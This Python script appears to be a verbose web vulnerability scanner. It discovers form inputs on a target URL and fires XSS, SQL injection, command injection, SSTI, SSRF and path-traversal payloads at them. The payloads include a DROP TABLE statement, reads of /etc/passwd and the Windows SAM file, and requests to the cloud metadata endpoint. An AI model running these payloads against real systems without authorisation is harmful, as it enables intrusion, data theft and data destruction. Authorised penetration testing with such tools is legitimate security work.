#!/usr/bin/env python3
"""
Jarwis AGI Pen Test - Input Field Attack Tester
================================================
This script demonstrates and tests input field attacks with VERBOSE output.

Features:
- Shows each payload being tested in real-time
- Displays HTTP requests/responses  
- Can run in browser-visible mode (types into fields visually)
- Tests XSS, SQLi, Command Injection, SSTI, etc.

Usage:
    python test_input_attacks.py --url https://example.com
    python test_input_attacks.py --url https://example.com --visible  # Browser-visible mode
    python test_input_attacks.py --url https://example.com --attack xss  # Specific attack
"""

import asyncio
import argparse
import logging
import sys
import time
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, urlencode, quote
from dataclasses import dataclass
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.live import Live
from rich.layout import Layout
from rich import print as rprint

# Configure rich console
console = Console()

# Configure logging with colors
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)


@dataclass  
class AttackResult:
    """Result from an attack test"""
    attack_type: str
    parameter: str
    payload: str
    url: str
    method: str
    status_code: int
    vulnerable: bool
    evidence: str = ""
    response_time: float = 0.0


class VerboseInputAttackTester:
    """
    Verbose tester for input field attacks.
    Shows every payload being sent in real-time.
    """
    
    # ============ ATTACK PAYLOADS ============
    
    XSS_PAYLOADS = [
        ('<script>alert("JARWIS_XSS")</script>', 'Basic script tag'),
        ('"><script>alert("JARWIS_XSS")</script>', 'Attribute escape + script'),
        ('<img src=x onerror=alert("JARWIS_XSS")>', 'IMG onerror'),
        ('<svg onload=alert("JARWIS_XSS")>', 'SVG onload'),
        ("'-alert('JARWIS_XSS')-'", 'JavaScript context escape'),
        ('{{constructor.constructor("alert(1)")()}}', 'Angular template injection'),
        ('${7*7}', 'Template literal'),
    ]
    
    SQLI_PAYLOADS = [
        ("'", 'Single quote'),
        ("''", 'Double single quote'),
        ("' OR '1'='1", 'OR always true'),
        ("' OR '1'='1' --", 'OR true with comment'),
        ("1' AND '1'='1", 'AND condition'),
        ("1' ORDER BY 1--", 'ORDER BY probe'),
        ("1' UNION SELECT NULL--", 'UNION probe'),
        ("'; DROP TABLE users--", 'Stacked query'),
        ("1' AND SLEEP(3)--", 'Time-based blind'),
    ]
    
    CMDI_PAYLOADS = [
        ('; ls -la', 'Linux list files'),
        ('| ls -la', 'Pipe list files'),
        ('& dir', 'Windows dir'),
        ('| cat /etc/passwd', 'Read passwd'),
        ('$(whoami)', 'Command substitution'),
        ('`id`', 'Backtick execution'),
        ('| ping -c 1 127.0.0.1', 'Ping localhost'),
    ]
    
    SSTI_PAYLOADS = [
        ('{{7*7}}', 'Jinja2/Twig math', '49'),
        ('${7*7}', 'Freemarker/EL math', '49'),
        ('#{7*7}', 'Ruby ERB math', '49'),
        ('{{config}}', 'Jinja2 config access', 'SECRET'),
        ('{{self.__class__}}', 'Jinja2 class access', 'class'),
        ('<%= 7*7 %>', 'ERB expression', '49'),
    ]
    
    SSRF_PAYLOADS = [
        ('http://127.0.0.1', 'Localhost'),
        ('http://localhost', 'Localhost hostname'),
        ('http://169.254.169.254/latest/meta-data/', 'AWS metadata'),
        ('http://[::1]', 'IPv6 localhost'),
        ('http://0.0.0.0', 'All interfaces'),
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        ('../../../etc/passwd', 'Linux passwd'),
        ('....//....//....//etc/passwd', 'Filter bypass'),
        ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd', 'URL encoded'),
        ('..\\..\\..\\windows\\system32\\config\\sam', 'Windows SAM'),
    ]
    
    # SQL error patterns
    SQL_ERRORS = [
        (r'SQL syntax', 'MySQL'),
        (r'mysql_', 'MySQL PHP'),
        (r'PostgreSQL.*ERROR', 'PostgreSQL'),
        (r'ORA-\d{5}', 'Oracle'),
        (r'SQLITE_ERROR', 'SQLite'),
        (r'Unclosed quotation mark', 'MSSQL'),
        (r'ODBC SQL Server', 'MSSQL ODBC'),
    ]
    
    def __init__(self, target_url: str, verbose: bool = True, browser_visible: bool = False):
        self.target_url = target_url
        self.verbose = verbose
        self.browser_visible = browser_visible
        self.results: List[AttackResult] = []
        self.session = None
        self.browser = None
        self.page = None
        
    async def start(self):
        """Initialize HTTP session and optionally browser"""
        import aiohttp
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Jarwis-Tester/1.0',
                'Accept': 'text/html,application/xhtml+xml,*/*',
            }
        )
        
        if self.browser_visible:
            await self._start_browser()
    
    async def _start_browser(self):
        """Start Playwright browser for visible attacks"""
        try:
            from playwright.async_api import async_playwright
            self.playwright = await async_playwright().start()
            self.browser = await self.playwright.chromium.launch(
                headless=False,  # VISIBLE BROWSER
                slow_mo=500  # Slow down for visibility
            )
            self.context = await self.browser.new_context()
            self.page = await self.context.new_page()
            console.print("[green]✓ Browser launched in VISIBLE mode[/green]")
        except Exception as e:
            console.print(f"[yellow]⚠ Could not start browser: {e}[/yellow]")
            self.browser_visible = False
    
    async def stop(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
        if self.browser:
            await self.browser.close()
        if hasattr(self, 'playwright'):
            await self.playwright.stop()
    
    async def discover_inputs(self) -> List[Dict]:
        """Discover input fields on the target page"""
        console.print(Panel(f"[bold cyan]Discovering input fields on {self.target_url}[/bold cyan]"))
        
        inputs = []
        
        try:
            if self.browser_visible and self.page:
                # Use browser to discover inputs (more accurate for SPAs)
                await self.page.goto(self.target_url, wait_until='networkidle')
                
                # Extract all input fields using JavaScript
                inputs = await self.page.evaluate('''() => {
                    const inputs = [];
                    
                    // Find all forms
                    document.querySelectorAll('form').forEach(form => {
                        const formAction = form.action || window.location.href;
                        const formMethod = (form.method || 'GET').toUpperCase();
                        
                        form.querySelectorAll('input, textarea, select').forEach(input => {
                            if (input.name && input.type !== 'hidden' && input.type !== 'submit') {
                                inputs.push({
                                    name: input.name,
                                    type: input.type || 'text',
                                    form_action: formAction,
                                    form_method: formMethod,
                                    placeholder: input.placeholder || '',
                                    id: input.id || '',
                                    selector: input.id ? '#' + input.id : 
                                              input.name ? `[name="${input.name}"]` : null
                                });
                            }
                        });
                    });
                    
                    // Also find standalone inputs not in forms
                    document.querySelectorAll('input:not(form input), textarea:not(form textarea)').forEach(input => {
                        if (input.name && input.type !== 'hidden') {
                            inputs.push({
                                name: input.name,
                                type: input.type || 'text',
                                form_action: window.location.href,
                                form_method: 'GET',
                                placeholder: input.placeholder || '',
                                id: input.id || '',
                                selector: input.id ? '#' + input.id : 
                                          input.name ? `[name="${input.name}"]` : null
                            });
                        }
                    });
                    
                    return inputs;
                }''')
            else:
                # Use HTTP to discover inputs
                async with self.session.get(self.target_url) as response:
                    html = await response.text()
                    inputs = self._parse_inputs_from_html(html)
            
            # Display discovered inputs
            if inputs:
                table = Table(title="Discovered Input Fields")
                table.add_column("Name", style="cyan")
                table.add_column("Type", style="green")
                table.add_column("Form Action", style="yellow")
                table.add_column("Method", style="magenta")
                
                for inp in inputs:
                    table.add_row(
                        inp.get('name', 'N/A'),
                        inp.get('type', 'text'),
                        inp.get('form_action', 'N/A')[:50],
                        inp.get('form_method', 'GET')
                    )
                
                console.print(table)
            else:
                console.print("[yellow]No input fields discovered[/yellow]")
                # Create a test input for demonstration
                inputs = [{
                    'name': 'q',
                    'type': 'text',
                    'form_action': self.target_url,
                    'form_method': 'GET',
                    'selector': None
                }]
                console.print("[blue]Using default 'q' parameter for testing[/blue]")
            
            return inputs
            
        except Exception as e:
            console.print(f"[red]Error discovering inputs: {e}[/red]")
            return [{'name': 'q', 'type': 'text', 'form_action': self.target_url, 'form_method': 'GET'}]
    
    def _parse_inputs_from_html(self, html: str) -> List[Dict]:
        """Parse input fields from HTML (fallback when browser not available)"""
        import re
        inputs = []
        
        # Find input elements
        input_pattern = r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>'
        for match in re.finditer(input_pattern, html, re.IGNORECASE):
            name = match.group(1)
            type_match = re.search(r'type=["\']([^"\']+)["\']', match.group(0))
            input_type = type_match.group(1) if type_match else 'text'
            
            if input_type not in ['hidden', 'submit', 'button']:
                inputs.append({
                    'name': name,
                    'type': input_type,
                    'form_action': self.target_url,
                    'form_method': 'GET'
                })
        
        # Find textarea elements
        textarea_pattern = r'<textarea[^>]+name=["\']([^"\']+)["\'][^>]*>'
        for match in re.finditer(textarea_pattern, html, re.IGNORECASE):
            inputs.append({
                'name': match.group(1),
                'type': 'textarea',
                'form_action': self.target_url,
                'form_method': 'POST'
            })
        
        return inputs
    
    async def run_attack(self, attack_type: str, inputs: List[Dict]) -> List[AttackResult]:
        """Run a specific attack type on discovered inputs"""
        
        attack_methods = {
            'xss': (self.XSS_PAYLOADS, self._test_xss),
            'sqli': (self.SQLI_PAYLOADS, self._test_sqli),
            'cmdi': (self.CMDI_PAYLOADS, self._test_cmdi),
            'ssti': (self.SSTI_PAYLOADS, self._test_ssti),
            'ssrf': (self.SSRF_PAYLOADS, self._test_ssrf),
            'path': (self.PATH_TRAVERSAL_PAYLOADS, self._test_path_traversal),
        }
        
        if attack_type not in attack_methods:
            console.print(f"[red]Unknown attack type: {attack_type}[/red]")
            return []
        
        payloads, test_func = attack_methods[attack_type]
        results = []
        
        console.print(Panel(f"[bold red]Running {attack_type.upper()} Attack[/bold red]"))
        console.print(f"[cyan]Payloads to test: {len(payloads)}[/cyan]")
        console.print(f"[cyan]Input fields to test: {len(inputs)}[/cyan]")
        console.print("")
        
        for inp in inputs:
            param_name = inp.get('name', 'unknown')
            form_action = inp.get('form_action', self.target_url)
            method = inp.get('form_method', 'GET')
            selector = inp.get('selector')
            
            console.print(f"[bold yellow]━━━ Testing parameter: {param_name} ━━━[/bold yellow]")
            
            for i, payload_info in enumerate(payloads):
                if isinstance(payload_info, tuple):
                    if len(payload_info) == 3:
                        payload, desc, expected = payload_info
                    else:
                        payload, desc = payload_info
                        expected = None
                else:
                    payload, desc, expected = payload_info, '', None
                
                # Show payload being tested
                console.print(f"  [dim]{i+1}/{len(payloads)}[/dim] [blue]{desc}[/blue]")
                console.print(f"      Payload: [red]{payload[:60]}{'...' if len(payload) > 60 else ''}[/red]")
                
                # Test via browser if visible mode
                if self.browser_visible and selector:
                    result = await self._test_via_browser(
                        selector, payload, param_name, attack_type
                    )
                else:
                    # Test via HTTP
                    result = await test_func(
                        form_action, method, param_name, payload, desc, expected
                    )
                
                if result:
                    results.append(result)
                    if result.vulnerable:
                        console.print(f"      [bold green]✓ VULNERABLE![/bold green]")
                        console.print(f"        Evidence: {result.evidence[:100]}")
                    else:
                        console.print(f"      [dim]✗ Not vulnerable (Status: {result.status_code})[/dim]")
                
                # Small delay to avoid rate limiting
                await asyncio.sleep(0.2)
            
            console.print("")
        
        return results
    
    async def _test_via_browser(self, selector: str, payload: str, param_name: str, attack_type: str) -> Optional[AttackResult]:
        """Test payload by TYPING into browser input field (visible mode)"""
        try:
            console.print(f"      [magenta]→ Typing into browser...[/magenta]")
            
            # Clear the input field
            await self.page.fill(selector, '')
            await asyncio.sleep(0.3)
            
            # Type the payload character by character (visible)
            await self.page.type(selector, payload, delay=30)
            await asyncio.sleep(0.3)
            
            # Try to submit (press Enter or click submit button)
            await self.page.press(selector, 'Enter')
            await asyncio.sleep(1)
            
            # Check for XSS execution (dialog)
            # This is handled by dialog event listener
            
            # Get page content to analyze
            content = await self.page.content()
            current_url = self.page.url
            
            # Check for vulnerability indicators
            vulnerable = False
            evidence = ""
            
            if attack_type == 'xss' and payload in content:
                vulnerable = True
                evidence = "Payload reflected in page"
            elif attack_type == 'sqli':
                import re
                for pattern, db_type in self.SQL_ERRORS:
                    if re.search(pattern, content, re.IGNORECASE):
                        vulnerable = True
                        evidence = f"SQL error detected: {db_type}"
                        break
            
            return AttackResult(
                attack_type=attack_type,
                parameter=param_name,
                payload=payload,
                url=current_url,
                method='BROWSER',
                status_code=200,
                vulnerable=vulnerable,
                evidence=evidence
            )
            
        except Exception as e:
            console.print(f"      [red]Browser test error: {e}[/red]")
            return None
    
    async def _test_xss(self, url: str, method: str, param: str, payload: str, desc: str, expected: str = None) -> AttackResult:
        """Test XSS payload via HTTP"""
        import re
        
        try:
            start_time = time.time()
            test_url, data = self._build_request(url, method, param, payload)
            
            if method == 'GET':
                async with self.session.get(test_url, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            else:
                async with self.session.post(url, data=data, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            
            elapsed = time.time() - start_time
            
            # Check if payload is reflected
            vulnerable = payload in body
            evidence = "Payload reflected in response" if vulnerable else ""
            
            # Check if it's in executable context
            if vulnerable:
                # Check for script tags, event handlers
                if '<script' in payload and '<script' in body:
                    evidence = "Script tag reflected - executable XSS"
                elif 'onerror' in payload or 'onload' in payload:
                    if re.search(r'on\w+\s*=', body):
                        evidence = "Event handler reflected - executable XSS"
            
            return AttackResult(
                attack_type='xss',
                parameter=param,
                payload=payload,
                url=test_url,
                method=method,
                status_code=status,
                vulnerable=vulnerable,
                evidence=evidence,
                response_time=elapsed
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='xss',
                parameter=param,
                payload=payload,
                url=url,
                method=method,
                status_code=0,
                vulnerable=False,
                evidence=f"Error: {e}"
            )
    
    async def _test_sqli(self, url: str, method: str, param: str, payload: str, desc: str, expected: str = None) -> AttackResult:
        """Test SQL injection payload"""
        import re
        
        try:
            start_time = time.time()
            test_url, data = self._build_request(url, method, param, payload)
            
            if method == 'GET':
                async with self.session.get(test_url, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            else:
                async with self.session.post(url, data=data, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            
            elapsed = time.time() - start_time
            
            # Check for SQL errors
            vulnerable = False
            evidence = ""
            
            for pattern, db_type in self.SQL_ERRORS:
                if re.search(pattern, body, re.IGNORECASE):
                    vulnerable = True
                    evidence = f"SQL error detected ({db_type})"
                    break
            
            # Time-based detection
            if 'SLEEP' in payload.upper() and elapsed > 2.5:
                vulnerable = True
                evidence = f"Time-based SQLi detected (response took {elapsed:.1f}s)"
            
            return AttackResult(
                attack_type='sqli',
                parameter=param,
                payload=payload,
                url=test_url,
                method=method,
                status_code=status,
                vulnerable=vulnerable,
                evidence=evidence,
                response_time=elapsed
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='sqli',
                parameter=param,
                payload=payload,
                url=url,
                method=method,
                status_code=0,
                vulnerable=False,
                evidence=f"Error: {e}"
            )
    
    async def _test_cmdi(self, url: str, method: str, param: str, payload: str, desc: str, expected: str = None) -> AttackResult:
        """Test command injection payload"""
        try:
            start_time = time.time()
            test_url, data = self._build_request(url, method, param, payload)
            
            if method == 'GET':
                async with self.session.get(test_url, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            else:
                async with self.session.post(url, data=data, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            
            elapsed = time.time() - start_time
            
            # Check for command output
            vulnerable = False
            evidence = ""
            
            cmd_indicators = [
                ('root:x:0:0', '/etc/passwd content'),
                ('bin/bash', 'Shell path'),
                ('uid=', 'User ID output'),
                ('Volume Serial Number', 'Windows dir output'),
                ('total ', 'ls output'),
            ]
            
            for indicator, desc in cmd_indicators:
                if indicator in body:
                    vulnerable = True
                    evidence = f"Command output detected: {desc}"
                    break
            
            return AttackResult(
                attack_type='cmdi',
                parameter=param,
                payload=payload,
                url=test_url,
                method=method,
                status_code=status,
                vulnerable=vulnerable,
                evidence=evidence,
                response_time=elapsed
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='cmdi',
                parameter=param,
                payload=payload,
                url=url,
                method=method,
                status_code=0,
                vulnerable=False,
                evidence=f"Error: {e}"
            )
    
    async def _test_ssti(self, url: str, method: str, param: str, payload: str, desc: str, expected: str = None) -> AttackResult:
        """Test SSTI payload"""
        try:
            start_time = time.time()
            test_url, data = self._build_request(url, method, param, payload)
            
            if method == 'GET':
                async with self.session.get(test_url, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            else:
                async with self.session.post(url, data=data, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            
            elapsed = time.time() - start_time
            
            # Check for template execution
            vulnerable = False
            evidence = ""
            
            if expected and expected in body:
                vulnerable = True
                evidence = f"Template executed: expected '{expected}' found in response"
            
            return AttackResult(
                attack_type='ssti',
                parameter=param,
                payload=payload,
                url=test_url,
                method=method,
                status_code=status,
                vulnerable=vulnerable,
                evidence=evidence,
                response_time=elapsed
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='ssti',
                parameter=param,
                payload=payload,
                url=url,
                method=method,
                status_code=0,
                vulnerable=False,
                evidence=f"Error: {e}"
            )
    
    async def _test_ssrf(self, url: str, method: str, param: str, payload: str, desc: str, expected: str = None) -> AttackResult:
        """Test SSRF payload"""
        try:
            start_time = time.time()
            test_url, data = self._build_request(url, method, param, payload)
            
            if method == 'GET':
                async with self.session.get(test_url, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            else:
                async with self.session.post(url, data=data, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            
            elapsed = time.time() - start_time
            
            # Check for SSRF indicators
            vulnerable = False
            evidence = ""
            
            ssrf_indicators = [
                ('ami-id', 'AWS metadata'),
                ('instance-id', 'Cloud metadata'),
                ('root:x:', 'Local file read'),
                ('127.0.0.1', 'Localhost access'),
                ('private', 'Private network access'),
            ]
            
            for indicator, desc in ssrf_indicators:
                if indicator.lower() in body.lower():
                    vulnerable = True
                    evidence = f"SSRF indicator: {desc}"
                    break
            
            return AttackResult(
                attack_type='ssrf',
                parameter=param,
                payload=payload,
                url=test_url,
                method=method,
                status_code=status,
                vulnerable=vulnerable,
                evidence=evidence,
                response_time=elapsed
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='ssrf',
                parameter=param,
                payload=payload,
                url=url,
                method=method,
                status_code=0,
                vulnerable=False,
                evidence=f"Error: {e}"
            )
    
    async def _test_path_traversal(self, url: str, method: str, param: str, payload: str, desc: str, expected: str = None) -> AttackResult:
        """Test path traversal payload"""
        try:
            start_time = time.time()
            test_url, data = self._build_request(url, method, param, payload)
            
            if method == 'GET':
                async with self.session.get(test_url, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            else:
                async with self.session.post(url, data=data, ssl=False) as response:
                    body = await response.text()
                    status = response.status
            
            elapsed = time.time() - start_time
            
            # Check for file content
            vulnerable = False
            evidence = ""
            
            file_indicators = [
                ('root:x:0:0', '/etc/passwd'),
                ('[boot loader]', 'Windows boot.ini'),
                ('SAM', 'Windows SAM'),
            ]
            
            for indicator, desc in file_indicators:
                if indicator in body:
                    vulnerable = True
                    evidence = f"File content detected: {desc}"
                    break
            
            return AttackResult(
                attack_type='path',
                parameter=param,
                payload=payload,
                url=test_url,
                method=method,
                status_code=status,
                vulnerable=vulnerable,
                evidence=evidence,
                response_time=elapsed
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='path',
                parameter=param,
                payload=payload,
                url=url,
                method=method,
                status_code=0,
                vulnerable=False,
                evidence=f"Error: {e}"
            )
    
    def _build_request(self, url: str, method: str, param: str, payload: str) -> tuple:
        """Build request URL and data with payload"""
        encoded_payload = quote(payload, safe='')
        
        if method == 'GET':
            if '?' in url:
                test_url = f"{url}&{param}={encoded_payload}"
            else:
                test_url = f"{url}?{param}={encoded_payload}"
            return test_url, None
        else:
            return url, {param: payload}
    
    def print_summary(self, results: List[AttackResult]):
        """Print attack summary"""
        console.print("\n")
        console.print(Panel("[bold]Attack Summary[/bold]", style="blue"))
        
        # Count vulnerabilities
        vulns = [r for r in results if r.vulnerable]
        
        if vulns:
            console.print(f"[bold red]⚠ Found {len(vulns)} potential vulnerabilities![/bold red]\n")
            
            table = Table(title="Vulnerabilities Found")
            table.add_column("Type", style="cyan")
            table.add_column("Parameter", style="yellow")
            table.add_column("Payload", style="red")
            table.add_column("Evidence", style="green")
            
            for v in vulns:
                table.add_row(
                    v.attack_type.upper(),
                    v.parameter,
                    v.payload[:40] + '...' if len(v.payload) > 40 else v.payload,
                    v.evidence[:50] if v.evidence else 'N/A'
                )
            
            console.print(table)
        else:
            console.print("[green]✓ No vulnerabilities detected[/green]")
        
        console.print(f"\nTotal payloads tested: {len(results)}")


async def main():
    parser = argparse.ArgumentParser(description='Jarwis Input Field Attack Tester')
    parser.add_argument('--url', '-u', required=True, help='Target URL to test')
    parser.add_argument('--attack', '-a', default='all', 
                        choices=['all', 'xss', 'sqli', 'cmdi', 'ssti', 'ssrf', 'path'],
                        help='Attack type to run (default: all)')
    parser.add_argument('--visible', '-v', action='store_true',
                        help='Run in browser-visible mode (types into input fields)')
    parser.add_argument('--param', '-p', help='Specific parameter to test')
    
    args = parser.parse_args()
    
    console.print(Panel.fit(
        "[bold cyan]Jarwis AGI Pen Test - Input Field Attack Tester[/bold cyan]\n"
        "[dim]Verbose mode enabled - showing all payloads[/dim]",
        border_style="cyan"
    ))
    
    console.print(f"\n[bold]Target:[/bold] {args.url}")
    console.print(f"[bold]Attack:[/bold] {args.attack}")
    console.print(f"[bold]Visible Mode:[/bold] {'Yes (browser)' if args.visible else 'No (HTTP only)'}")
    console.print("")
    
    tester = VerboseInputAttackTester(
        target_url=args.url,
        verbose=True,
        browser_visible=args.visible
    )
    
    try:
        await tester.start()
        
        # Discover inputs
        inputs = await tester.discover_inputs()
        
        # Filter by specific param if provided
        if args.param:
            inputs = [i for i in inputs if i.get('name') == args.param]
            if not inputs:
                console.print(f"[red]Parameter '{args.param}' not found[/red]")
                return
        
        all_results = []
        
        # Run attacks
        if args.attack == 'all':
            for attack_type in ['xss', 'sqli', 'cmdi', 'ssti']:
                results = await tester.run_attack(attack_type, inputs)
                all_results.extend(results)
        else:
            results = await tester.run_attack(args.attack, inputs)
            all_results.extend(results)
        
        # Print summary
        tester.print_summary(all_results)
        
    finally:
        await tester.stop()


if __name__ == '__main__':
    asyncio.run(main())
